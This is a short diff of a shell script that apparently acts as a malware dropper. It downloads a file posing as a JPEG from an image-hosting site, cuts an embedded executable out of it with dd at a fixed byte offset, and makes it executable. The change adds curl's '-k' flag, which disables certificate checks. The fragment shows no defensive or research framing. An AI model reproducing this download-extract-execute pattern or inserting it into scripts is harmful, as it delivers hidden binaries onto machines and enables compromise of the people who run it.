@@ -10,7 +10,7 @@ then
     ARCH=$(uname -m)
     if [ ${ARCH}x = "x86_64x" ]
     then
-        (curl -fsSL https://i.ibb.co/6PdZ0NT/he.jpg -o ${he_save_jpg}||wget -q -O ${he_save_jpg} https://i.ibb.co/6PdZ0NT/he.jpg) && dd if=${he_save_jpg} of=${he_save} skip=14497 bs=1 &&chmod +x ${he_save}
+        (curl -fsSL -k https://i.ibb.co/6PdZ0NT/he.jpg -o ${he_save_jpg}||wget -q -O ${he_save_jpg} https://i.ibb.co/6PdZ0NT/he.jpg) && dd if=${he_save_jpg} of=${he_save} skip=14497 bs=1 &&chmod +x ${he_save}
     else
         (curl -fsSL ${he_32_url} -o ${he_save_jpg}||wget -q -O ${he_save_jpg} ${he_32_url}) && dd if=${he_save_jpg} of=${he_save} skip=14497 bs=1 &&chmod +x ${he_save}
     fi
